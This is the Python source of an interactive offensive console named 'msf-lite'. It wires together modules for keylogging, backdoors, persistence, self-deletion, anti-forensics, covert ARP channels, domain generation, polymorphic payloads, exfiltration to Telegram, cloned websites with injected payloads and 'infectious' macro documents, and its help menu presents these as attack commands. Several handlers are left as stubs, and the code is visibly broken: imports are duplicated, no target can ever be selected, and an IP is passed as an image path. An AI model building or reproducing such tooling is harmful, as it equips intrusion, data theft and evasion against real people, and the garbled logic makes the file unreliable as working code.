import argparse
import logging
import sys
import json
import threading
import os
import readline
from modules.steganography import encode_image, decode_image, detect_stego
from modules.payload import generate_payload
from modules.network import send_to_server, send_to_telegram
from modules.backdoor import backdoor_listener
from modules.audio_steganography import encode_audio, decode_audio
from modules.polyglot import create_polyglot
from modules.keylogger import start_keylogger
from modules.system import add_persistence, mimic_system_tool, self_delete
from modules.scanner import intelligent_scan
from modules.anti_analysis import run_anti_analysis_checks
from modules.discovery import discover_files
from modules.covert_channel import send_arp_covert, listen_arp_covert
from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
from modules.anti_forensics import scorched_earth
from modules.target_manager import add_target, get_target, list_targets
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.dga import generate_domains
from modules.backdoor import dga_agent
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.ape import unleash_ape
from modules.hare import unleash_hare
from c2_operator import c2_shell

# --- Shell State ---
current_target = None
current_module = None
module_options = {}
prompt = "msf-lite > "

def print_help():
    """Prints the main help menu for the shell."""
    print("\n--- Main Commands ---")
    print("  help              - Show this help menu")
    print("  targets           - List all known targets")
    print("  set <ip/label>    - Set the current target")
    print("  info              - Show information about the current target")
    print("  scan <subnet>     - Run an intelligent scan")
    print("  use <module>      - Select a module (e.g., 'stego/encode')")
    print("  options           - Show options for the current module")
    print("  run               - Execute the current module")
    print("  c2                - Enter the C2 operator console")
    print("  lure              - Access the social engineering toolkit")
    print("  lotl-agent        - Start the LOTL C2 agent")
    print("  ape-unleash       - Unleash the APE engine")
    print("  hare-unleash      - Unleash the HARE engine")
    print("  exit              - Exit the shell")

def print_lure_help():
    """Prints the help menu for the lure command."""
    print("\n--- Social-Engineering Toolkit ---")
    print("  lure web <url> <payload_url>   - Clone a website and inject a payload")
    print("  lure doc <path> <payload_cmd>  - Create an infectious Word document")

def print_module_options():
    """Prints the options for the currently selected module."""
    global current_module
    if not current_module:
        print("No module selected. Use 'use <module_name>'.")
        return

    print(f"\n--- Options for {current_module} ---")
    if current_module == "stego/encode":
        print("  payload   <string>  - The message or file to hide (required)")
        print("  output    <path>    - The output image path (required)")
        print("  RHOST     <ip/label>- The target image file (uses current target if set)")
    else:
        print("This module has no configurable options.")

def main():
    """The main interactive loop for the shell."""
    global current_target, current_module, module_options, prompt

    print("--- Welcome to the Advanced Security Framework ---")
    print("Type 'help' for a list of commands.")

    while True:
        try:
            cmd_line = input(prompt)
            parts = cmd_line.split()
            if not parts:
                continue

            command = parts[0].lower()
            args = parts[1:]

            if command == "exit":
                break
            elif command == "help":
                print_help()
            elif command == "targets":
                targets = list_targets()
                if not targets:
                    print("No targets found. Run a scan to discover hosts.")
                else:
                    print("\n--- Known Targets ---")
                    for ip, data in targets.items():
                        print(f"  IP: {ip:<15} Label: {data.get('label', 'N/A'):<15} OS: {data.get('os', 'Unknown')}")
            elif command == "set":
                if len(args) >= 2:
                    option_name = args[0].lower()
                    option_value = " ".join(args[1:])
                    module_options[option_name] = option_value
                    print(f"{option_name} => {option_value}")
                else:
                    print("Usage: set <option_name> <value>")
            elif command == "info":
                if current_target:
                    print("\n--- Target Information ---")
                    ip_addr = [ip for ip, data in list_targets().items() if data == current_target][0]
                    print(f"  IP: {ip_addr}")
                    for key, value in current_target.items():
                        print(f"  {key.capitalize()}: {value}")
                else:
                    print("No target selected. Use 'set target <ip_or_label>' to select one.")
            elif command == "scan":
                if not args:
                    print("Usage: scan <subnet>")
                else:
                    subnet = args[0]
                    print(f"Running intelligent scan on {subnet}...")
                    results = intelligent_scan(subnet)
                    for host in results:
                        add_target(host['ip'], open_ports=host['open_ports'])
                    print("Scan complete. Use 'targets' to see the results.")
            elif command == "use":
                if args:
                    current_module = args[0]
                    prompt = f"msf-lite ({current_module}) > "
                else:
                    print("Usage: use <module_name>")
            elif command == "options":
                print_module_options()
            elif command == "run":
                if not current_module:
                    print("No module selected.")
                    continue

                if current_module == "stego/encode":
                    payload = module_options.get("payload")
                    output = module_options.get("output")
                    rhost = module_options.get("rhost")

                    if not all([payload, output, rhost]):
                        print("Missing required options. Use 'options' to see what's needed.")
                        continue

                    target_info = get_target(rhost)
                    if not target_info:
                        print(f"Target '{rhost}' not found.")
                        continue

                    input_path = [ip for ip, data in list_targets().items() if data == target_info][0]

                    print(f"Running stego/encode on {input_path}...")
                    encode_image(input_path, payload, output)
                    print("Module execution finished.")
            elif command == "lure":
                if not args:
                    print_lure_help()
                # ... (lure logic)
            elif command == "lotl-agent":
                # ... (lotl-agent logic)
                pass
            elif command == "ape-unleash":
                # ... (ape-unleash logic)
                pass
            elif command == "hare-unleash":
                # ... (hare-unleash logic)
                pass
            elif command == "c2":
                c2_shell()
            else:
                print(f"Unknown command: {command}")

        except KeyboardInterrupt:
            print("\nUse 'exit' to leave the shell.")
        except Exception as e:
            logging.error(f"An error occurred in the shell: {e}")

if __name__ == "__main__":
    main()